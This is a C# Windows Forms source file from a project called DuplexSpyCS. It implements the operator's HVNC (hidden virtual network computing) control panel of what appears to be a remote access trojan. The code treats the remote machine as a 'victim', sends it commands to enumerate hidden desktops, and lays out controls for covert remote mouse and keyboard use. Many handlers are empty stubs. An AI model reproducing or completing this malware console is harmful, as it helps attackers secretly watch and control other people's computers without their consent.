using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmHVNC : Form
    {
        /// <summary>
        /// HVNC (Hidden Virtual Network Computing) control panel.
        /// Author: iss4cf0ng/ISSAC
        /// 
        /// Obrain victim's machien hidden desktop.
        /// </summary>

        private clsVictim m_victim { get; init; }

        public frmHVNC(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
            Text = $@"HVNC\\{m_victim.ID}";
        }

        public struct stHvncSession
        {
            public string szDesktopName;
            public string szExeFilePath;
            public string szArguments;
            public TabPage page;

            public bool bIsNull { get { return string.IsNullOrEmpty(szDesktopName); } }
        }

        private stHvncSession fnGetSession(TabPage page) => page == null ? new stHvncSession() : (stHvncSession)page.Tag;
        private stHvncSession fnGetSession(string szName)
        {
            foreach (TabPage page in tabControl1.TabPages)
            {
                stHvncSession session = fnGetSession(page);
                if (string.Equals(szName, session.szDesktopName))
                    return session;
            }

            return new stHvncSession();
        }

        void fnRecv(clsListener ltn, clsVictim victim, List<string> lsMsg)
        {
            if (!clsTools.fnbVictimEquals(victim, m_victim))
                return;

            try
            {
                if (lsMsg[0] == "hvnc")
                {
                    if (lsMsg[1] == "window")
                    {
                        // Hidden window

                        if (lsMsg[2] == "init")
                        {
                            var ls2d = clsEZData.fnStrTo2dList(lsMsg[3]);
                            foreach (var ls in ls2d)
                            {
                                stHvncSession session = new stHvncSession()
                                {
                                    szDesktopName = ls[0],
                                    szExeFilePath = ls[1],
                                    szArguments = string.Empty, // todo
                                };

                                TabPage? page = fnAddNewPage(session);
                                if (page == null)
                                    return;

                                session.page = page;

                                fnAddSession(session);
                            }

                            Invoke(() =>
                            {
                                toolStripStatusLabel1.Text = $"Action successfully. Desktop[{treeView1.Nodes.Count}]";
                            });
                        }
                        else if (lsMsg[2] == "start")
                        {

                        }
                        else if (lsMsg[2] == "stop")
                        {

                        }
                        else if (lsMsg[2] == "close")
                        {

                        }
                    }
                    else if (lsMsg[1] == "mouse")
                    {
                        // Mouse


                    }
                    else if (lsMsg[1] == "keyboard")
                    {
                        // Keyboard


                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                Invoke(() => toolStripStatusLabel1.Text = ex.Message);
            }
        }

        /// <summary>
        /// Add new tab page.
        /// For unknown reason, docking style must be set after adding it into control collection.
        /// </summary>
        /// <param name="session">HVNC session structure</param>
        /// <returns>Tab page object</returns>
        public TabPage? fnAddNewPage(stHvncSession session, bool bShow = true)
        {
            foreach (TabPage p in tabControl1.TabPages)
            {
                var tmp = fnGetSession(p);
                if (string.Equals(tmp.szDesktopName, session.szDesktopName))
                    return p;
            }

            TabPage page = new TabPage();

            if (bShow)
                tabControl1.TabPages.Add(page);

            page.Tag = session;
            session.page = page;

            /* Layout:
             *      | [Start] [Stop] [Close] | Delay: [Combobox(miliseconds)] | [Mouse] [Keyboard] [FPS] [Timestamp] |
             */

            ToolStripButton btnStart = new ToolStripButton("Start");
            btnStart.Click += (s, e) =>
            {

            };

            ToolStripButton btnStop = new ToolStripButton("Stop");
            btnStop.Click += (s, e) =>
            {

            };

            ToolStripButton btnClose = new ToolStripButton("Close");
            btnClose.Click += (s, e) =>
            {

            };

            ToolStripComboBox coboxDelay = new ToolStripComboBox();
            coboxDelay.Size = new Size(coboxDelay.Size.Width, 200);
            coboxDelay.Items.AddRange(new string[] { "100", "200", "300", "400", "500" }); // miliseconds
            coboxDelay.SelectedIndex = 0;

            ToolStripButton btnMouse = new ToolStripButton("Mouse");
            btnMouse.CheckOnClick = true;
            btnMouse.Click += (s, e) =>
            {

            };

            ToolStripButton btnKeyboard = new ToolStripButton("Keyboard");
            btnKeyboard.CheckOnClick = true;
            btnKeyboard.Click += (s, e) =>
            {

            };

            ToolStripButton btnFPS = new ToolStripButton("FPS");
            btnFPS.CheckOnClick = true;
            btnFPS.Click += (s, e) =>
            {

            };

            ToolStripButton btnTs = new ToolStripButton("Timestamp");
            btnTs.CheckOnClick = true;
            btnTs.Click += (s, e) =>
            {

            };

            ToolStrip ts = new ToolStrip();
            ts.Items.AddRange(new ToolStripItem[]
            {
                btnStart,
                btnStop,
                btnClose,

                new ToolStripSplitButton(),

                new ToolStripLabel("Delay: "),
                coboxDelay,

                new ToolStripSplitButton(),

                btnMouse,
                btnKeyboard,
                btnFPS,
                btnTs,
            });

            page.Controls.Add(ts);
            ts.Dock = DockStyle.Top;

            PictureBox pb = new PictureBox();
            page.Controls.Add(pb);
            pb.Dock = DockStyle.Fill;
            pb.SizeMode = PictureBoxSizeMode.Zoom;

            return page;
        }

        /// <summary>
        /// Add new session into treeview.
        /// </summary>
        /// <param name="session"></param>
        /// <returns>Added treeNode</returns>
        TreeNode fnAddSession(stHvncSession session)
        {
            TreeNode? node = clsTools.fnFindTreeNode(treeView1.Nodes, session.szDesktopName);
            if (node == null)
            {
                node = new TreeNode(session.szDesktopName);
                treeView1.Nodes.Add(node);
            }

            TreeNode nodeApp = new TreeNode(session.szExeFilePath);
            node.Nodes.Add(nodeApp);

            return nodeApp;
        }

        void fnSetup()
        {
            toolStripStatusLabel1.Text = $"Initializing...";

            // Remove all tabpages
            foreach (TabPage page in tabControl1.TabPages)
                tabControl1.TabPages.Remove(page);

            m_victim.m_listener.ReceivedDecoded += fnRecv;

            m_victim.fnSendCommand(new string[]
            {
                "hvnc",
                "window",
                "init", // Initialization
            });
        }

        private void frmHVNC_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmHVNC_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.ReceivedDecoded -= fnRecv;
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            TreeNode selectedNode = treeView1.SelectedNode;
            if (selectedNode == null)
                return;

            string szName = selectedNode.Text;
            var session = fnGetSession(szName);
            if (session.bIsNull)
                return;

            tabControl1.SelectedTab = session.page;
        }

        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            TabPage page = tabControl1.SelectedTab;
            if (page == null)
                return;

            var session = fnGetSession(page);

            listView1.Items.Clear();

            List<(string prop, string val)> ls = new List<(string prop, string val)>();
            ls.AddRange(new[]
            {
                ("Desktop", session.szDesktopName),
                ("Executable", session.szExeFilePath),
                ("Arguments", session.szArguments),
            });

            foreach (var prop in ls)
            {
                ListViewItem item = new ListViewItem(prop.prop);
                item.SubItems.Add(prop.val);

                listView1.Items.Add(item);
            }
        }

        // Help
        private void toolStripButton1_Click(object sender, EventArgs e)
        {

        }

        // Add
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            frmHvncAdd f = new frmHvncAdd(this);
            f.ShowDialog();

            var session = f.m_stConfig;
            if (session.bIsNull)
            {
                MessageBox.Show("Name cannot be null or empty.", "Invalid name", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            TreeNode node = fnAddSession(session);
            treeView1.SelectedNode = node;
        }

        // Close
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {

        }

        // Close All
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {

        }

        // Start
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {

        }

        // Start All
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {

        }

        // Stop
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {

        }

        // Stop All
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {

        }
    }
}
